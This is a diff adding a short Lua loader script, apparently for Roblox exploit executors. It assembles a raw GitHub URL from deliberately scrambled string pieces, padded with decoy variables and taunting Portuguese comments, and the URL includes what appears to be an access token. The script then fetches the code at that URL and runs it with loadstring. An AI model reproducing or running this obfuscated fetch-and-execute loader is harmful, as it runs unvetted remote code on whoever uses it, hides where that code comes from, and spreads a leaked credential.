@@ -1,0 +1,18 @@
+if "you are a dumb skidder" then
+    local SUKUNA = "wx-sources/"
+    local r = ".com/"
+    local dumb = "n5yth5e5ru5n5e/refs/heads/"
+    local j = "token=GHSAT0AAAAAADEDECGOL6BMGTNJ67Q4VWO42D6TPCA"
+    local q = "usercontent"
+    local skidder = "s2c3r1ip77t-h4ub?"
+    local p = "https://raw.github"
+    local erreifuimlk = "main/"
+    local you = "spacecomm/refs/heads/" -- ve dnv kkkkkk
+    local x = "wx" -- aqui é o Wx tenho 10 anos kkkkkk
+    local ee = "sources" -- meu nome é Yan kkkkkkkjj
+
+    local w, g, f = task.wait, game, loadstring
+    local url = p .. q .. r .. SUKUNA .. dumb .. erreifuimlk .. skidder .. j
+    f(g:HttpGet(url))()
+    return ("Yes, you are a dumb skidder." or "dependendo do seu executor e dispositivo")
+end
